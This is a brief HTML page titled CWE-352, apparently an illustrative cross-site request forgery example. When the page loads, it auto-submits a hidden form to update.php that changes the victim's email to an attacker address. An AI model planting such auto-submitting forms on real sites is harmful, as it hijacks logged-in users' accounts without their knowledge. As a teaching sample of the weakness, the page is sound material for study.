<!DOCTYPE html>
<html>
<head>
<title>CWE-352</title>
</head>

<body>
<script>
function sendAttack () {
    form.email = "attacker@test.com";
    form.submit();
}
</script>

<body onload="javascript:sendAttack();">
<form action="update.php" id="form" method="post">
    <input type="hidden" name="firstname" value="Funny">
    <input type="hidden" name="lastname" value="Joke">
    <br/>
    <input type="hidden" name="email">
</form>
</body>
</html>